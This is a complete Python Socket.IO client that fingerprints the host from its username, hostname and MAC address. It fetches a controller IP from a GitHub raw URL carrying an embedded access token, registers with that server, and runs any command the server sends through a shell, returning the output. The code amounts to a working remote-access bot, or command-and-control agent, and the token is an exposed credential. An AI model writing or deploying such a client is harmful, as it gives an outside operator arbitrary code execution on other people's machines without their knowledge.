import socketio
import socket
import getpass
import uuid
import hashlib
import subprocess
import requests

# Function to compute a unique device ID from username, hostname, and MAC address.
def get_device_id():
    user = getpass.getuser()
    hostname = socket.gethostname()
    mac = uuid.getnode()  # Returns MAC as an integer.
    raw_str = f"{user}-{hostname}-{mac}"
    return hashlib.sha256(raw_str.encode()).hexdigest()

device_id = get_device_id()
print("Unique Device ID:", device_id)

# Instantiate a SocketIO client.
sio = socketio.Client()

@sio.event
def connect():
    print("Connected to server")
    # Register this client immediately with its unique device ID.
    sio.emit('register', {'device_id': device_id})

@sio.on('registered')
def on_registered(data):
    print("Registration confirmed:", data)

@sio.on('command')
def on_command(data):
    command = data.get('command')
    print("Received command:", command)
    result = execute_command(command)
    # Send the execution result back to the server.
    sio.emit('result', {'device_id': device_id, 'result': result})

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode(errors='replace')
    except subprocess.CalledProcessError as e:
        return f"Error executing command: {e.output.decode(errors='replace')}"
@sio.event
def disconnect():
    print("Disconnected from server")

if __name__ == '__main__':
    # Replace 'http://your-server-ip:5000' with your server's URL.
    # Fetch the IP address from the given URL.
    try:
        response = requests.get('https://raw.githubusercontent.com/xXxNIKIxXx/AbiStreich/refs/heads/main/ip.txt?token=GHSAT0AAAAAACZLAFG3KL2DYZMNEMJJSSEOZ6ZE77Q')
        response.raise_for_status()
        server_ip = response.text.strip()
        print("Fetched server IP:", server_ip)
    except requests.RequestException as e:
        print("Error fetching server IP:", e)
        exit(1)

    # Connect to the fetched server IP.
    sio.connect(f'http://{server_ip}')
    sio.wait()
